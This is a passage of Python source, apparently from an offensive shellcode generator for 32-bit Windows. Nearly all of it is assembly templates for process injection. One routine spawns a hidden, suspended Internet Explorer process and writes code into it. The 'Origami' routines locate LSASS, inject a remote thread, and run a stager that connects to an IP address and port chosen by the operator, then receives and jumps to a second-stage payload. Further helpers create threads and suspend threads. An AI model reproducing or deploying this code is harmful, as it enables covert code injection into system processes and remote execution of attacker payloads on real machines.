        pushl %ecx
        pushl %edx
        pushl %edi

// yeah yeah :>

        // zero out vars before use
        // 800 bytes total
        xorl %eax,%eax
        xorl %edx,%edx
zerome:
        movl %eax,(%edi,%edx,4)
        incl %edx
        cmpb $200,%dl
        jne zerome

// set startupinfo cb (size to 68) and STARTF_USESHOWWINDOW, SF_HIDE is already to 0
movl $68,(%ecx) // size is 68
incl 44(%ecx) // STARTF_USESHOWWINDOW is 0x1

        // restore edx
        //movl 4(%esp),%edx

//int3
// make room for our IE string
subl $0x200,%esp
leal PROGRAM_FILES-geteip(%ebx),%eax
movl %esp,%edi
// save ecx
pushl %ecx
pushl $0x200
pushl %edi
pushl %eax
call *getenvironmentvariablea-geteip(%ebx)
// restore ecx
popl %ecx
// eax has returned len
addl %eax,%edi
// edi is pointing at start, copy over INJECT_TO_ME
leal INJECT_TO_ME-geteip(%ebx),%esi

// copy the string over (yeah yeah, we'll get rep stos)
copy:
movb (%esi),%dl
movb %dl,(%edi)
incl %esi
incl %edi
test %dl,%dl
jnz copy
donecopy:

movl %esp,%esi
//int3
xorl %eax,%eax

        // restore edx
        movl 0x204(%esp),%edx

        // &PROCESS_INFORMATION
        pushl %edx
        // &STARTUPINFO = {0}
        movl %eax,(%ecx)
        pushl %ecx
        // NULL
        pushl %eax
        // NULL
        pushl %eax
        // DETACHED_PROCESS is 0x8, NO WINDOW is 0x08000000 (create flags)
        //pushl $0x00000008

//XXX bugfix .. CREATE_SUSPENDED | NEW_CONSOLE
        pushl $20

        // 0
        pushl %eax
        // NULL
        pushl %eax
        // NULL
        pushl %eax
        // leal command string into esi here
        pushl %esi
        // NULL
        pushl %eax
        call createprocessa-geteip(%ebx)

        // restore pointers to structs
        movl 0x200(%esp),%edi
        movl 0x204(%esp),%edx

// openprocess()
//
// Access rights needed:
// 
// PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION
// PROCESS_VM_OPERATION | PROCESS_VM_WRITE
// PROCESS_VM_READ == 0x43a
// loop till open succeeds

//int3


// PID of new process is at 8(%edx)
movl 8(%edx),%edi

pushl %edi
pushl $0
pushl $0x43a
call openprocess-geteip(%ebx)
test %eax,%eax

jz done

// save pid and self

pushl %esi
pushl %edi

// save handle

movl %eax,%edi

// virtualallocex()
//
// edi has pid
// edi has the handle
// fProtect is PAGE_EXECUTE_READWRITE == 0x40

pushl $0x40

// flAllocationType is MEM_COMMIT (do not touch physical memory) == 0x1000

pushl $0x1000

// len arg gives the length of the shellcode we want to write
// this code is appended after the 'end' label so practically
// this means you get sc.get() + thecodetoinject

// this is rounded off to the closest page size due to lpAddress being NULL

pushl $CODESIZE
pushl $0
pushl %edi //process handle, not pid
call virtualallocex-geteip(%ebx)

// writeprocessmemory()
//
// eax has base address
// edi has the handle

// save addy
pushl %eax

writeout:

pushl $0   //pByteswritten
pushl $CODESIZE //size
leal codemark-geteip(%ebx),%esi
pushl %esi   //buffer
pushl %eax  //base address
pushl %edi //process
call writeprocessmemory-geteip(%ebx)
test %eax,%eax
jz writeout

popl %eax

// createremotethread()
//
// code address is eax
// process handle is edi

pushl $0    //thread id
pushl $0    //creation flags
pushl $0      //parameter
pushl %eax   //start address
pushl $0     //stack size
pushl $0    //thread attributes
pushl %edi //process
call createremotethread-geteip(%ebx)

// get back pid and self

popl %edi
popl %esi

// invalid handle for some reason ?
test %eax,%eax
jz done

// push handle here save some space
//pushl %eax

// WaitForSingleObject() with INFINITE timeout (-1)

//pushl $-1
//pushl %eax
//call waitforsingleobject-geteip(%ebx)

// closehandle() on thread handle and process handle, handle is already pushed

//int3
// eax already pushed!!!
//call closehandle-geteip(%ebx)
//pushl %edi
//call closehandle-geteip(%ebx)

jmp done
// bail out of this one

codemark:

        """


        InjectToSelfCode = InjectToSelfCode.replace("CODESIZE", "0x%x"%int(len(args["injectme"])))
        InjectToSelfCode += ".urlencoded \"%s\"\n"%urllib.quote(args["injectme"])
        InjectToSelfCode += "done:\n"
        if "append" in args:
            InjectToSelfCode += args["append"]

        InjectToSelfCode += "jmp poststrings\n"

        # my strings go here
        InjectToSelfCode += "SE_DEBUG_NAME:\n.ascii \"SeDebugPrivilege\"\n.byte 0x00\n"
        InjectToSelfCode += "INJECT_TO_ME:\n"
        InjectToSelfCode += ".urlencoded \""+urllib.quote("\\Internet Explorer\\iexplore.exe")+"\""
        InjectToSelfCode += "\n.byte 0x00\n"
        InjectToSelfCode += "PROGRAM_FILES:\n"
        InjectToSelfCode += ".urlencoded \""+urllib.quote("ProgramFiles")+"\""
        InjectToSelfCode += "\n.byte 0x00\n"

        InjectToSelfCode += "poststrings:\n"
        #no exitprocess in this code means it spins forever?
        #nopes - seems to work without this call to exitprocess
        #hmm, sometimes the process will spin! Why?!?
        #sometimes we want to execute more code after the injection
        if dontexit == False:
            InjectToSelfCode += "call *exitprocess-geteip(%ebx)\n"

        self.imports.append("kernel32.getcurrentprocess")
        self.imports.append("kernel32.closehandle")
        self.imports.append("kernel32.waitforsingleobject")
        self.imports.append("advapi32.lookupprivilegevaluea")
        self.imports.append("advapi32.openprocesstoken")
        self.imports.append("advapi32.adjusttokenprivileges")
        self.imports.append("kernel32.getcurrentprocessid")
        self.imports.append("kernel32.openprocess")
        self.imports.append("kernel32.virtualallocex")
        self.imports.append("kernel32.writeprocessmemory")
        self.imports.append("kernel32.createremotethread")
        self.imports.append("kernel32.createprocessa")
        self.imports.append("advapi32.setthreadtoken")
        self.imports.append("kernel32.getenvironmentvariablea")
        if dontexit == False:
            self.imports.append("kernel32.exitprocess")

        self.code += InjectToSelfCode
        return

    def OrigamiInject(self, args):
        """
        This code injects payload as remote thread into another process
        it's useful when your target process heap is mangled beyond
        recognition.

        XXX: this code is in horrible need of a rewrite !!!

        """
        if not self.foundeip:
            #print "Don't have eip and are trying to use it!"
            self.findeip([0])

        heapSafeInjectIntoLsassCode = """
//int3

call getcurrentprocessid-geteip(%ebx)
mov %eax,%esi

// openprocess()
//
// Access rights needed:
// 
// PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION
// PROCESS_VM_OPERATION | PROCESS_VM_WRITE
// PROCESS_VM_READ == 0x43a
// loop till open succeeds

// get the process into %edi

// get 0x8000 room

pushl $0x40
pushl $0x1000
pushl $0x8004
pushl $0
call virtualalloc-geteip(%ebx)

movl %eax,%edi

pushl %edi
pushl $0x8000
addl $4,%edi
pushl %edi
pushl $5
call ntquerysysteminformation-geteip(%ebx)

// save information for backup
pushl %edi

// ptr = buffer + p->NextEntryDelta
next_delta:

// don't ask ;P
nop
// check if no next delta, if none, jmp to backup
movl (%edi),%eax
test %eax,%eax
jz backup

addl (%edi),%edi
// offset to ptr to UNICODE_STRING ProcessName is 0x38 + 4 
movl 0x3c(%edi),%esi
movl $LSASSLEN,%ecx
// cmp if len matches first, if not next delta
xorl %edx,%edx
movw 0x38(%edi),%dx
cmpl %ecx,%edx
jne next_delta
// 3 nops loss :/
leal lsassname-geteip(%ebx),%edx
next_byte:
movb (%esi),%al
cmpb %al,(%edx)
jne next_delta
incl %esi
incl %edx
decl %ecx
jnz next_byte
// found LSASS.EXE !
movl 0x44(%edi),%edi

jmp openpid

backup:

popl %edi

// ptr = buffer + p->NextEntryDelta
next_delta_backup:
addl (%edi),%edi
// offset to ptr to UNICODE_STRING ProcessName is 0x38 + 4 
movl 0x3c(%edi),%esi
movl $BACKUPLEN,%ecx
// cmp if len matches first, if not next delta
xorl %edx,%edx
movw 0x38(%edi),%dx
cmpl %ecx,%edx
jne next_delta_backup
// 3 nops loss :/
leal backupname-geteip(%ebx),%edx
next_byte_backup:
movb (%esi),%al
cmpb %al,(%edx)
jne next_delta_backup
incl %esi
incl %edx
decl %ecx
jnz next_byte_backup
// found backup.exe !
movl 0x44(%edi),%edi

openpid:

pushl %edi
pushl $0
pushl $0x43a
call openprocess-geteip(%ebx)
test %eax,%eax
jz openpid

pushl %edi

// save handle
movl %eax,%edi

// virtualallocex()
//
// edi has the handle
// fProtect is PAGE_EXECUTE_READWRITE == 0x40

pushl $0x40

// flAllocationType is MEM_COMMIT (do not touch physical memory) == 0x1000

pushl $0x1000

// this is rounded off to the closest page size due to lpAddress being NULL

pushl $CODESIZE
pushl $0
pushl %edi
call virtualallocex-geteip(%ebx)

// writeprocessmemory()
//
// eax has base address
// edi has the handle

"""
        if "injectme" in args:
            pass
        else:
            heapSafeInjectIntoLsassCode += """
// save base
pushl %eax
// save handle
pushl %edi

writefunctiontable:
// copy over the inited functiontable
// we're writing into old hashcode land
leal codemarkend-geteip(%ebx),%edi
leal functiontable-geteip(%ebx),%esi
xorl %ecx,%ecx
transferfunctiontable:
movl (%esi,%ecx,4),%eax
movl %eax,(%edi,%ecx,4)
incl %ecx
cmpb $TABLESIZE,%cl
jne transferfunctiontable

// get back handle and base
popl %edi
popl %eax
"""

        heapSafeInjectIntoLsassCode += """
// save base
pushl %eax

writeout:

pushl $0
pushl $CODESIZE
leal codemark-geteip(%ebx),%esi
pushl %esi
pushl %eax
pushl %edi
call *writeprocessmemory-geteip(%ebx)
test %eax,%eax
jz writeout

// get base
popl %eax

// createremotethread()
//
// code address is eax
// process handle is edi

pushl $0
pushl $0
pushl $0
pushl %eax
pushl $0
pushl $0
pushl %edi  
call *createremotethread-geteip(%ebx)

// invalid handle for some reason ? try again
popl %edi

test %eax,%eax
jz openpid

//WAITCODEINSERT

// go to any appends
jmp append
        """

        OrigamiInjectmeIntoLsass = """
//int3
        call pcloc
pcloc:
        popl %ebx

        //call socket
        pushl $6
        pushl $1
        pushl $2
        cld
        call *socket-pcloc(%ebx)
        movl %eax,%esi //save this off
        leal 4(%esp),%edi
        movl $PORT,4(%esp)
        movl $IPADDRESS,8(%esp)
        push $0x10 
        pushl %edi
        pushl %eax
        call *connect-pcloc(%ebx)

        movl %esp,%edi
gogetlen:
        pushl $0
        push $4
        pushl %edi 
        pushl %esi
        call *recv-pcloc(%ebx)
//int3
        movl (%edi),%eax
        subl %eax,%esp
        andl $-4,%esp
        movl %esp,%edi
gogotlen:
        pushl $0
        pushl %eax
        pushl %edi
        pushl %esi
        call *recv-pcloc(%ebx)
stagetwo:
//int3
        subl $0x1000,%esp
        jmp *%edi

// faux place holders, these get chopped off later

functiontable:
kernel32:
getcurrentprocessid:
.long 0x00000000
openprocess:
.long 0x00000000
virtualallocex:
.long 0x00000000
writeprocessmemory:
.long 0x00000000
createremotethread:
.long 0x00000000
getsystemdirectorya:
.long 0x00000000
loadlibrarya:
.long 0x00000000
virtualalloc:
.long 0x00000000
exitprocess:
.long 0x00000000
"""

        if "revert" in args and int(args["revert"]):
            # XXX: kludge for revert option (needed for IM)
            OrigamiInjectmeIntoLsass += """
advapi32:
reverttoself:
.long 0x00000000
"""

        OrigamiInjectmeIntoLsass += """
ntdll:
ntquerysysteminformation:
.long 0x00000000
ws2_32:
wsastartup:
.long 0x00000000
socket:
.long 0x00000000
connect:
.long 0x00000000
recv:
.long 0x00000000

codeloc:
"""
        if "ipaddress" not in args:
            print "No ipaddress passed to tcpconnect!!!"
        if "port" not in args:
            print "no port in args of tcpconnect"

        ipaddress=socket.inet_aton(socket.gethostbyname(args["ipaddress"]))
        port=int(args["port"]) 

        OrigamiInjectmeIntoLsass=OrigamiInjectmeIntoLsass.replace("IPADDRESS", uint32fmt(istr2int(ipaddress)))
        OrigamiInjectmeIntoLsass=OrigamiInjectmeIntoLsass.replace("PORT", uint32fmt(reverseword((0x02000000 | port))))

        if "injectme" in args:
            injectme = args["injectme"]
        else:
            injectme = mosdef.assemble(OrigamiInjectmeIntoLsass, "X86")

        print "Assembled Origami injectmecode (%d bytes)"%len(injectme)
        heapSafeInjectIntoLsassCode = heapSafeInjectIntoLsassCode.replace("CODESIZE", "0x%x"%len(injectme))

        if "injectme" in args:
            devlog("Leaving out function table transfer in lsass inject...")
        else:
            functionCount = 14
            if "revert" in args and int(args["revert"]):
                functionCount = 15
            tablesize = functionCount * 4
            heapSafeInjectIntoLsassCode = heapSafeInjectIntoLsassCode.replace("TABLESIZE", "0x%x"%(tablesize/4))


            # chop of faux place holders, we'll write into our hashing code which we dont need at this
            # point anyways (size: 12 functions * 4 bytes)
            injectme = injectme[:-tablesize]

        heapSafeInjectIntoLsassCode += "append:\n"
        if "append" in args:
            newcode=args["append"]
            heapSafeInjectIntoLsassCode += newcode
            devlog("shellcode","ORIGAMICODE: appending *%s*"%newcode)
            devlog("shellcode", "args: %s"%str(args))
        elif "injectme" in args:
            newcode="\ncall *exitthread-geteip(%ebx)\n"
            heapSafeInjectIntoLsassCode += newcode
            devlog("shellcode", "ORIGAMICODE: appending %s"%newcode)            
        else:
            newcode="\ncall *exitprocess-geteip(%ebx)\n"            
            heapSafeInjectIntoLsassCode += newcode
            devlog("shellcode", "ORIGAMICODE: appending %s"%newcode)            

        heapSafeInjectIntoLsassCode += "codemark:\n.urlencoded \"%s\"\ncodemarkend:\n"%urllib.quote(injectme)
        # slap on LSASS.EXE as a MS UNICODE string
        if "processname" in args:
            lsassname = msunistring(args["processname"])
        else:
            lsassname = msunistring("LSASS.EXE")
        heapSafeInjectIntoLsassCode += "lsassname:\n.urlencoded \"%s\"\n"%urllib.quote(lsassname)
        # -2 to compensate for nul termination (2 bytes widechar)
        heapSafeInjectIntoLsassCode = heapSafeInjectIntoLsassCode.replace("LSASSLEN", "0x%x"%(len(lsassname)-2))

        # slap on backupname as a MS UNICODE string
        if "backupprocess" in args:
            backup = msunistring(args["backupprocess"])
        else:
            backup = msunistring("lsass.exe")
        heapSafeInjectIntoLsassCode += "backupname:\n.urlencoded \"%s\"\n"%urllib.quote(backup)
        # -2 to compensate for nul termination (2 bytes widechar)
        heapSafeInjectIntoLsassCode = heapSafeInjectIntoLsassCode.replace("BACKUPLEN", "0x%x"%(len(backup)-2))

        self.imports.append("kernel32.getcurrentprocessid")
        self.imports.append("kernel32.openprocess")
        self.imports.append("kernel32.virtualallocex")
        self.imports.append("kernel32.writeprocessmemory")
        self.imports.append("kernel32.createremotethread")
        # these we give to our injected code
        self.imports.append("kernel32.getsystemdirectorya")
        self.imports.append("kernel32.loadlibrarya")
        ##
        if "injectme" not in args:
            self.imports.append("ws2_32.wsastartup")
            self.imports.append("ws2_32.socket")
            self.imports.append("ws2_32.connect")
            self.imports.append("ws2_32.recv")
        self.imports.append("ntdll.ntquerysysteminformation")
        self.imports.append("kernel32.virtualalloc")

        self.code += heapSafeInjectIntoLsassCode
        return

    def OrigamiInjectSmall(self, args):
        """
        This code injects payload as remote thread into another process
        it's useful when your target process heap is mangled beyond
        recognition.
        """
        if not self.foundeip:
            #print "Don't have eip and are trying to use it!"
            self.findeip([0])

        heapSafeInjectIntoLsassCode = """

call getcurrentprocessid-geteip(%ebx)
mov %eax,%esi

// openprocess()
//
// Access rights needed:
// 
// PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION
// PROCESS_VM_OPERATION | PROCESS_VM_WRITE
// PROCESS_VM_READ == 0x43a
// loop till open succeeds

// get the process into %edi

// get 0x8000 room

pushl $0x40
pushl $0x1000
pushl $0x8004
pushl $0
call virtualalloc-geteip(%ebx)

movl %eax,%edi

pushl %edi
pushl $0x8000
addl $4,%edi
pushl %edi
pushl $5
call ntquerysysteminformation-geteip(%ebx)

// ptr = buffer + p->NextEntryDelta
next_delta:

addl (%edi),%edi
// offset to ptr to UNICODE_STRING ProcessName is 0x38 + 4 
movl 0x3c(%edi),%esi
movl $LSASSLEN,%ecx
// cmp if len matches first, if not next delta
xorl %edx,%edx
movw 0x38(%edi),%dx
cmpl %ecx,%edx
jne next_delta
// 3 nops loss :/
leal lsassname-geteip(%ebx),%edx
next_byte:
movb (%esi),%al
cmpb %al,(%edx)
jne next_delta
incl %esi
incl %edx
decl %ecx
jnz next_byte
// found LSASS.EXE !
movl 0x44(%edi),%edi

openpid:

pushl %edi
pushl $0
pushl $0x43a
call openprocess-geteip(%ebx)
test %eax,%eax
jz openpid

pushl %edi

// save handle
movl %eax,%edi

// virtualallocex()
//
// edi has the handle
// fProtect is PAGE_EXECUTE_READWRITE == 0x40

pushl $0x40

// flAllocationType is MEM_COMMIT (do not touch physical memory) == 0x1000

pushl $0x1000

// this is rounded off to the closest page size due to lpAddress being NULL

pushl $CODESIZE
pushl $0
pushl %edi
call virtualallocex-geteip(%ebx)

// writeprocessmemory()
//
// eax has base address
// edi has the handle

"""
        if "injectme" in args:
            pass
        else:
            heapSafeInjectIntoLsassCode += """
// save base
pushl %eax
// save handle
pushl %edi

writefunctiontable:
// copy over the inited functiontable
// we're writing into old hashcode land
leal codemarkend-geteip(%ebx),%edi
leal functiontable-geteip(%ebx),%esi
xorl %ecx,%ecx
transferfunctiontable:
movl (%esi,%ecx,4),%eax
movl %eax,(%edi,%ecx,4)
incl %ecx
cmpb $TABLESIZE,%cl
jne transferfunctiontable

// get back handle and base
popl %edi
popl %eax
"""

        heapSafeInjectIntoLsassCode += """
// save base
pushl %eax

writeout:

pushl $0
pushl $CODESIZE
leal codemark-geteip(%ebx),%esi
pushl %esi
pushl %eax
pushl %edi
call *writeprocessmemory-geteip(%ebx)
test %eax,%eax
jz writeout

// get base
popl %eax

// createremotethread()
//
// code address is eax
// process handle is edi

pushl $0
pushl $0
pushl $0
pushl %eax
pushl $0
pushl $0
pushl %edi  
call *createremotethread-geteip(%ebx)

// invalid handle for some reason ? try again
popl %edi

test %eax,%eax
jz openpid

//WAITCODEINSERT

// go to any appends
jmp append
        """

        OrigamiInjectmeIntoLsass = """
//int3
        call pcloc
pcloc:
        popl %ebx

        //call socket
        pushl $6
        pushl $1
        pushl $2
        cld
        call *socket-pcloc(%ebx)
        movl %eax,%esi //save this off
        leal 4(%esp),%edi
        movl $PORT,4(%esp)
        movl $IPADDRESS,8(%esp)
        push $0x10 
        pushl %edi
        pushl %eax
        call *connect-pcloc(%ebx)

        movl %esp,%edi
gogetlen:
        pushl $0
        push $4
        pushl %edi 
        pushl %esi
        call *recv-pcloc(%ebx)
//int3
        movl (%edi),%eax
        subl %eax,%esp
        andl $-4,%esp
        movl %esp,%edi
gogotlen:
        pushl $0
        pushl %eax
        pushl %edi
        pushl %esi
        call *recv-pcloc(%ebx)
stagetwo:
//int3
        subl $0x1000,%esp
        jmp *%edi

// faux place holders, these get chopped off later

functiontable:
kernel32:
getcurrentprocessid:
.long 0x00000000
openprocess:
.long 0x00000000
virtualallocex:
.long 0x00000000
writeprocessmemory:
.long 0x00000000
createremotethread:
.long 0x00000000
getsystemdirectorya:
.long 0x00000000
loadlibrarya:
.long 0x00000000
virtualalloc:
.long 0x00000000
exitprocess:
.long 0x00000000
ntdll:
ntquerysysteminformation:
.long 0x00000000
ws2_32:
wsastartup:
.long 0x00000000
socket:
.long 0x00000000
connect:
.long 0x00000000
recv:
.long 0x00000000

codeloc:
"""
        if "ipaddress" not in args:
            print "No ipaddress passed to tcpconnect!!!"
        if "port" not in args:
            print "no port in args of tcpconnect"

        ipaddress=socket.inet_aton(socket.gethostbyname(args["ipaddress"]))
        port=int(args["port"]) 

        OrigamiInjectmeIntoLsass=OrigamiInjectmeIntoLsass.replace("IPADDRESS", uint32fmt(istr2int(ipaddress)))
        OrigamiInjectmeIntoLsass=OrigamiInjectmeIntoLsass.replace("PORT", uint32fmt(reverseword((0x02000000 | port))))

        if "injectme" in args:
            injectme = args["injectme"]
        else:
            injectme = mosdef.assemble(OrigamiInjectmeIntoLsass, "X86")

        print "Assembled Origami injectmecode (%d bytes)"%len(injectme)
        heapSafeInjectIntoLsassCode = heapSafeInjectIntoLsassCode.replace("CODESIZE", "0x%x"%len(injectme))

        if "injectme" in args:
            print "Leaving out function table transfer in lsass inject..."
        else:
            tablesize = 14*4
            heapSafeInjectIntoLsassCode = heapSafeInjectIntoLsassCode.replace("TABLESIZE", "0x%x"%(tablesize/4))


            # chop of faux place holders, we'll write into our hashing code which we dont need at this
            # point anyways (size: 12 functions * 4 bytes)
            injectme = injectme[:-tablesize]

        heapSafeInjectIntoLsassCode += "append:\n"
        if "append" in args:
            heapSafeInjectIntoLsassCode += args["append"]
        elif "injectme" in args:
            heapSafeInjectIntoLsassCode += "\ncall *exitthread-geteip(%ebx)\n"
        else:
            heapSafeInjectIntoLsassCode += "\ncall *exitprocess-geteip(%ebx)\n"            

        heapSafeInjectIntoLsassCode += "codemark:\n.urlencoded \"%s\"\ncodemarkend:\n"%urllib.quote(injectme)
        # slap on LSASS.EXE as a MS UNICODE string
        if "processname" in args:
            lsassname = msunistring(args["processname"])
        else:
            lsassname = msunistring("LSASS.EXE")
        heapSafeInjectIntoLsassCode += "lsassname:\n.urlencoded \"%s\"\n"%urllib.quote(lsassname)
        # -2 to compensate for nul termination (2 bytes widechar)
        heapSafeInjectIntoLsassCode = heapSafeInjectIntoLsassCode.replace("LSASSLEN", "0x%x"%(len(lsassname)-2))

        self.imports.append("kernel32.getcurrentprocessid")
        self.imports.append("kernel32.openprocess")
        self.imports.append("kernel32.virtualallocex")
        self.imports.append("kernel32.writeprocessmemory")
        self.imports.append("kernel32.createremotethread")
        # these we give to our injected code
        self.imports.append("kernel32.getsystemdirectorya")
        self.imports.append("kernel32.loadlibrarya")
        # not needed if injectme is given .. size optimize - nico
        if "injectme" not in args:
            self.imports.append("ws2_32.wsastartup")
            self.imports.append("ws2_32.socket")
            self.imports.append("ws2_32.connect")
            self.imports.append("ws2_32.recv")
        self.imports.append("ntdll.ntquerysysteminformation")
        self.imports.append("kernel32.virtualalloc")

        self.code += heapSafeInjectIntoLsassCode
    
    def CreateThreadCode(self, args):
        if not self.foundeip:
            self.findeip([0])
        code = """
        // alloc mem
        pushl $0x40
        pushl $0x1000
        pushl $CODELEN
        pushl $0
        call virtualalloc-geteip(%ebx)
        // pump over the code
        leal codetag-geteip(%ebx),%esi
        mov $CODELEN,%ecx
        pushl %eax
copycode:
        movb (%esi),%dl
        movb %dl,(%eax)
        inc %eax
        inc %esi
        loop copycode
        // now we can createthread
        popl %eax
        pushl $0
        pushl $0
        pushl %eax
        pushl $0
        pushl $0
        pushl $0
        call createthread-geteip(%ebx)
        jmp done      
        """
        code = code.replace("CODELEN", "0x%.8x"%len(args["threadme"]))       
        code += "codetag:\n.urlencoded \"%s\"\n"%urllib.quote(args["threadme"])
        code += "done:\n"

        self.imports += ["kernel32.virtualalloc"]
        self.imports += ["kernel32.createthread"]

        self.code += code
        return

    def divByZero(self, args):
        divcode = """
        xorl %eax,%eax
        pushl %eax
        div %eax
        """
        self.code += divcode
        return

    def moveToStack(self, args):
        # standalone stub that can move a payload to stack
        # takes in 'Length' arg
        code = """

        jmp moveme
getloc:
        popl %esi // source at moveme

        subl $LEN,%esp
        andl $0xffffff00,%esp // align
        movl %esp,%edi // dest

        movl $LEN,%ecx
        rep movsb

        // jmp to stack
        jmp %esp

moveme:
        call getloc
        """
        code = code.replace("LEN", "%d"% int(args["Length"]))
        self.code = code
        return

    def suspendthreads(self,args):
        """
        Suspends all-except-current threads

        """

        code="""
call *getcurrentprocessid-geteip(%ebx)
movl %eax, %ebp
call *getcurrentthreadid-geteip(%ebx)
movl %eax, %edi

pushl $0
pushl $4
call *createtoolhelp32snapshot-geteip(%ebx)
movl %eax, %esi
cmpl $0xFFFFFFFF, %eax
jz after_strings

mov *thread32first-geteip(%ebx), %eax

loop_threads:
//THREADENTRY32 struct
movl $28, dwSize-geteip(%ebx)
leal dwSize-geteip(%ebx), %ecx
pushl %ecx
pushl %esi
call %eax

cmpl $1, %eax
jnz after_strings
cmpl $0x00000010, dwSize-geteip(%ebx)
jl get_next
cmpl th32OwnerProcessID-geteip(%ebx), %ebp
jnz get_next
cmpl th32ThreadID-geteip(%ebx), %edi
jz get_next

//OPEN THREAD
//THREAD_SUSPEND_RESUME (0x0002)
pushl th32ThreadID-geteip(%ebx)
pushl $0
pushl $2
call *openthread-geteip(%ebx)

//SUSPEND
push %eax
call *suspendthread-geteip(%ebx)

get_next:
mov *thread32next-geteip(%ebx), %eax
jmp loop_threads

dwSize:
.long 0x0
.long 0x0
th32ThreadID:
.long 0x0
th32OwnerProcessID:
.long 0x0
.long 0x0
.long 0x0
.long 0x0
after_strings:
        """

        self.imports.append("kernel32.openthread")
        self.imports.append("kernel32.suspendthread")
        self.imports.append("kernel32.createtoolhelp32snapshot")
        self.imports.append("kernel32.thread32first")
        self.imports.append("kernel32.thread32next")
        self.imports.append("kernel32.getcurrentprocessid")
        self.imports.append("kernel32.getcurrentthreadid")

        self.code+=code

    def testMe(self):
        #self.addAttr("UseWS2Ordinal",None)
        self.addAttr("findeip",None)
        self.addAttr("winexec",{"command":"echo > hi"})
        self.addAttr("revert_to_self_before_importing_ws2_32",None)
        #self.addAttr("GOFindSock",None)
        #self.addAttr("tcpconnect",{"port":4544,"ipaddress":"127.0.0.1"})
        #self.addAttr("RecvExecWin32", None)

        try:
            data=self.get()
            debug=1
        except SystemExit:
            debug=1
            #debug=1
        if debug:
            code=self.getcode()
            print "Code=%s"%code
            printlines(code,42)
            data=""
        #data=self.get()
        print "len(shellcode)=%d"%len(data)
        print "daveHash of reverttoself=%x"% getDaveHash("reverttoself")
        return data


#TODO:
#udp dns shellcode with an xml service that sets up the payload...
if __name__=="__main__":
    obj=win32()
    obj.testMe()

